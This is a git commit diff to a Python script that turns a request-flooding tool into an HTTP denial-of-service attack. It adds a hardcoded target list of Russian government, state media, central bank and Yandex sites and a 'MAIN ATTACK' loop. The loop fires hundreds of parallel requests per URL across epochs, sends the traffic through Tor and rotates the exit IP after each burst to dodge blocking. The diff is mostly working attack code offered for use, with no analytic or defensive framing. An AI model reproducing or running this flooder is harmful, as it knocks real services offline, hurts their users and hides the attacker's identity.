9200865fcd9593c3a2070375106ca63b1258e751
leo <leo.ertuna@gmail.com>
2022-02-26 07:54:09 +0300

    New vastly improved script

--- v2.py
+++ v2.py
@@ -1,3 +1,4 @@
+import threading
 import time
 from typing import Dict, Any, List, Tuple
 import requests
@@ -11,7 +12,8 @@ from stem import Signal
 from stem.control import Controller
 
 
-
+# DO NOT TOUCH THESE
+#-----------------------------------------------------------------------------------------------------------------------
 ALL_LETTERS = []
 ALL_LETTERS.extend(ascii_lowercase)
 ALL_LETTERS.extend(ascii_uppercase)
@@ -34,6 +36,59 @@ HTTP_STATUS_CODE_BAD_GATEWAY = 502
 HTTP_STATUS_CODE_SERVICE_UNAVAILABLE = 503
 HTTP_STATUS_CODE_CONNECTION_TIMEOUT = -1000
 HTTP_STATUS_CODE_PROXY_ERROR = -2000
+HTTP_STATUS_CODE_SSL_ERROR = -3000
+HTTP_STATUS_CODE_CONNECTION_ERROR = -4000
+HTTP_STATUS_CODE_READ_TIMEOUT = -5000
+HTTP_STATUS_CODE_TOO_MANY_REDIRECTS = -6000
+
+
+TOR_CHANGE_IP_LOCK = threading.Lock()
+#-----------------------------------------------------------------------------------------------------------------------
+
+
+# Change configuration here
+#-----------------------------------------------------------------------------------------------------------------------
+LIST_OF_URLS = [
+    "http://www.rt.com",
+    "https://russian.rt.com/",
+    "http://www.cbr.ru",
+    "http://rbc.ru",
+    "http://www.kremlin.ru",
+    "http://www.vesti.ru",
+    "https://vsoloviev.ru/",
+    "https://tass.ru/",
+    "https://tvzvezda.ru/",
+    "http://www.smotrim.ru",
+    "http://www.vgtrk.ru",
+    "https://www.kommersant.ru",
+    "https://www.kp.ru/",
+    "https://rg.ru/",
+    "http://194.190.37.226:80",
+    "https://cdnimg.rg.ru/img/content/227/24/50/2p_gorlovka-podval(1)_t_310x206.jpg",
+    "https://outercdn.rg.ru/covid-19/result.json?rel=25-02-2022-20&callbackCovid=callbackCovid",
+    "https://front.rg.ru/api/currency/result.json?callback=callback&_=1645822786176",
+    "http://lenta.ru",
+    "https://ria.ru/lenta/",
+    "http://gosuslugi.ru",
+    "https://yandex.ru/",
+    "https://tv.yandex.ru/?utm_source=main_stripe_big",
+    "https://tv.yandex.ru/api/sk",
+    "https://music.yandex.ru/?utm_source=main_stripe_big",
+    "https://auto.ru/?utm_source=main_stripe_big",
+    "https://yandex.ru/news/?utm_source=main_stripe_big",
+    "https://strm.yandex.ru/probe/jobs?count=5&size=51200",
+    "https://akamai.strm.yandex.net/probe/test_file_51200.mp4?size=51200&rnd=3843909514455359",
+    "https://www.1tv.ru",
+    "https://zakupki.gov.ru/",
+]
+
+NUMBER_OF_EPOCHS = 10
+PARALLEL_LIST_OF_URLS_WORKERS = 2
+PARALLEL_SINGLE_URL_MIN_REQUESTS = 150
+PARALLEL_SINGLE_URL_MAX_REQUESTS = 400
+PARALLEL_SINGLE_URL_WORKERS = 50
+ENABLE_TOR = True
+#-----------------------------------------------------------------------------------------------------------------------
 
 
 
@@ -107,6 +162,14 @@ def make_request(http_method: str, url: str, body: Dict = {}, headers: Dict = {}
         return (HTTP_STATUS_CODE_CONNECTION_TIMEOUT, None, None)
     except requests.exceptions.ProxyError as e2:
         return (HTTP_STATUS_CODE_PROXY_ERROR, None, None)
+    except requests.exceptions.SSLError as e3:
+        return (HTTP_STATUS_CODE_SSL_ERROR, None, None)
+    except requests.exceptions.ConnectionError as e4:
+        return (HTTP_STATUS_CODE_CONNECTION_ERROR, None, None)
+    except requests.exceptions.ReadTimeout as e5:
+        return (HTTP_STATUS_CODE_READ_TIMEOUT, None, None)
+    except requests.exceptions.TooManyRedirects as e6:
+        return (HTTP_STATUS_CODE_TOO_MANY_REDIRECTS, None, None)
 
 
     response_json = None
@@ -122,7 +185,7 @@ def make_request(http_method: str, url: str, body: Dict = {}, headers: Dict = {}
     return (response.status_code, response_json, response_content)
 
 
-def make_requests_parallel(http_method: str, url: str, number_of_requests: int, max_worker_count: int, body: Dict = {}, headers: Dict = {}, proxies: Dict = {}, timeout: int = 10) -> (List[Tuple[int, Dict[str, Any], bytes]], float):
+def make_requests_parallel(http_method: str, url: str, number_of_requests: int, max_worker_count: int, body: Dict = {}, headers: Dict = {}, proxies: Dict = {}, timeout: int = 15) -> (List[Tuple[int, Dict[str, Any], bytes]], float):
     t1 = time.time()
     results = []
     executor = concurrent.futures.ThreadPoolExecutor(max_workers=max_worker_count)
@@ -133,15 +196,21 @@ def make_requests_parallel(http_method: str, url: str, number_of_requests: int, 
     return results, t
 
 
-def debug_stats(results: List[Tuple[int, Dict[str, Any], bytes]], t: float):
+def debug_stats(http_method: str, url: str, results: List[Tuple[int, Dict[str, Any], bytes]], t: float):
     print('debug_stats(): ----------------------- ')
+    print('debug_stats(): ' + http_method + ' ' + url)
     success_responses = len([r for r in results if 200 <= r[0] <= 299])
     redirect_responses = len([r for r in results if 300 <= r[0] <= 399])
     client_error_responses = len([r for r in results if 400 <= r[0] <= 499])
     not_found_responses = len([r for r in results if r[0] == HTTP_STATUS_CODE_NOT_FOUND])
     method_not_allowed_responses = len([r for r in results if r[0] == HTTP_STATUS_CODE_METHOD_NOT_ALLOWED])
     server_error_responses = len([r for r in results if 500 <= r[0] <= 599])
-    timeouts = len([r for r in results if r[0] == HTTP_STATUS_CODE_CONNECTION_TIMEOUT])
+    connection_timeouts = len([r for r in results if r[0] == HTTP_STATUS_CODE_CONNECTION_TIMEOUT])
+    proxy_errors = len([r for r in results if r[0] == HTTP_STATUS_CODE_PROXY_ERROR])
+    ssl_errors = len([r for r in results if r[0] == HTTP_STATUS_CODE_SSL_ERROR])
+    connection_errors = len([r for r in results if r[0] == HTTP_STATUS_CODE_CONNECTION_ERROR])
+    read_timeouts = len([r for r in results if r[0] == HTTP_STATUS_CODE_READ_TIMEOUT])
+    too_many_redirects = len([r for r in results if r[0] == HTTP_STATUS_CODE_TOO_MANY_REDIRECTS])
 
     print('debug_stats(): Total responses count: ' + str(len(results)))
     if success_responses > 0:
@@ -159,8 +228,18 @@ def debug_stats(results: List[Tuple[int, Dict[str, Any], bytes]], t: float):
     if server_error_responses > 0:
         print('debug_stats(): Server error responses (5XX): ' + str(server_error_responses))
 
-    if timeouts > 0:
-        print('debug_stats(): Timeouts (by client): ' + str(timeouts))
+    if connection_timeouts > 0:
+        print('debug_stats(): Connection timeouts (by client): ' + str(connection_timeouts))
+    if proxy_errors > 0:
+        print('debug_stats(): Proxy errors (by client): ' + str(proxy_errors))
+    if ssl_errors > 0:
+        print('debug_stats(): SSL errors (by client): ' + str(ssl_errors))
+    if connection_errors > 0:
+        print('debug_stats(): Connections errors (by client): ' + str(connection_errors))
+    if read_timeouts > 0:
+        print('debug_stats(): Read timeouts (by client): ' + str(read_timeouts))
+    if too_many_redirects > 0:
+        print('debug_stats(): Too many redirects (by client): ' + str(too_many_redirects))
 
     print('debug_stats(): Execution time is ' + str(round(t, 2)) + ' s,' + ' speed is ' + str(round(len(results) / t, 2)) + ' r/s')
     print('debug_stats(): ')
@@ -170,13 +249,14 @@ def debug_stats(results: List[Tuple[int, Dict[str, Any], bytes]], t: float):
 
 # TOR helpers
 #-----------------------------------------------------------------------------------------------------------------------
-def switch_tor_ip():
-    time.sleep(1)
-    with Controller.from_port(port=9051) as controller:
-        controller.authenticate(password='my password')
-        controller.signal(Signal.NEWNYM)
-    print("switch_tor_ip(): Generated new IP")
-    time.sleep(1)
+def change_ip_tor():
+    with TOR_CHANGE_IP_LOCK:
+        time.sleep(1)
+        with Controller.from_port(port=9051) as controller:
+            controller.authenticate(password='my password')
+            controller.signal(Signal.NEWNYM)
+        print("switch_tor_ip(): Generated new IP")
+        time.sleep(1)
 
 def check_my_ip_with_tor() -> (int, Dict[str, Any], bytes):
     result = make_request('GET', 'https://api.myip.com/', proxies=get_proxies_tor())
@@ -223,33 +303,6 @@ def test_get_random_body():
         print('test_get_random_body(): Generated body with size of dict', sys.getsizeof(body), 'bytes, and size of string', sys.getsizeof(str(body)), 'bytes')
     print('test_get_random_body(): Ended')
 
-def test_make_request():
-    r = make_request("GET", "http://google.com")
-    print('CODE:', r[0])
-    print('JSON:', type(r[1]), r[1])
-    print('CONTENT:', type(r[2]), r[2])
-    print('\n')
-    r = make_request("GET", "https://api.myip.com/")
-    print('CODE:', r[0])
-    print('JSON:', type(r[1]), r[1])
-    print('CONTENT:', type(r[2]), r[2])
-    print('\n')
-    r = make_request("GET", "https://example.com/sadjhdaslkjasd")
-    print('CODE:', r[0])
-    print('JSON:', type(r[1]), r[1])
-    print('CONTENT:', type(r[2]), r[2])
-    print('\n')
-    r = make_request("POST", "https://stackoverflow.com/users/login-or-signup/validation/track")
-    print('CODE:', r[0])
-    print('JSON:', type(r[1]), r[1])
-    print('CONTENT:', type(r[2]), r[2])
-
-def test_make_requests_parallel():
-    number_of_requests = 300
-    max_worker_count = 100
-    results, t = make_requests_parallel('GET', "https://tekleo.net/", number_of_requests, max_worker_count, headers=get_headers())
-    debug_stats(results, t)
-
 def test_global():
     test_get_random_user_agent()
     print('')
@@ -260,16 +313,48 @@ def test_global():
     test_get_random_body()
 #-----------------------------------------------------------------------------------------------------------------------
 
-#test_make_requests_parallel()
-#test_global()
 
 
-print("Started main script!")
-for epoch in range(0, 10):
-    print('------- Epoch #', epoch, '-------')
+# Attack mode
+#-----------------------------------------------------------------------------------------------------------------------
+def attack_single(http_method_and_url: Tuple[str, str], use_tor: bool):
+    http_method = http_method_and_url[0]
+    url = http_method_and_url[1]
+    number_of_requests = random.randint(PARALLEL_SINGLE_URL_MIN_REQUESTS, PARALLEL_SINGLE_URL_MAX_REQUESTS)
+    max_worker_count = PARALLEL_SINGLE_URL_WORKERS
+
+    proxies = {}
+    if use_tor:
+        proxies = get_proxies_tor()
+
+    if http_method == HTTP_METHOD_GET:
+        results, t = make_requests_parallel(http_method, url, number_of_requests, max_worker_count, headers=get_headers(), proxies=proxies, timeout=7)
+    else:
+        results, t = make_requests_parallel(http_method, url, number_of_requests, max_worker_count, body=get_random_body(), headers=get_headers(), proxies=proxies, timeout=7)
+
+    debug_stats(http_method, url, results, t)
+
+    if use_tor:
+        change_ip_tor()
+
+
+def attack_multiple(list_of_http_methods_and_urls: List[Tuple[str, str]], use_tor: bool):
+    results = []
+    executor = concurrent.futures.ThreadPoolExecutor(max_workers=PARALLEL_LIST_OF_URLS_WORKERS)
+    for result in executor.map(attack_single, list_of_http_methods_and_urls, repeat(use_tor)):
+        results.append(result)
+#-----------------------------------------------------------------------------------------------------------------------
+
+
+
+# MAIN ATTACK
+for epoch in range(0, NUMBER_OF_EPOCHS):
+    print('\n\n------- Attack Epoch #'  + str(epoch) + ' -------')
     check_my_ip_with_tor()
-    number_of_requests = random.randint(200, 400)
-    max_worker_count = 100
-    results, t = make_requests_parallel('GET', "http://tekleo.net/", number_of_requests, max_worker_count, headers=get_headers(), proxies=get_proxies_tor())
-    debug_stats(results, t)
-    switch_tor_ip()
+
+    # Build URLs
+    list_of_http_methods_and_urls = [("GET", url) for url in LIST_OF_URLS]
+    random.shuffle(list_of_http_methods_and_urls)
+
+    # Run attack
+    attack_multiple(list_of_http_methods_and_urls, ENABLE_TOR)
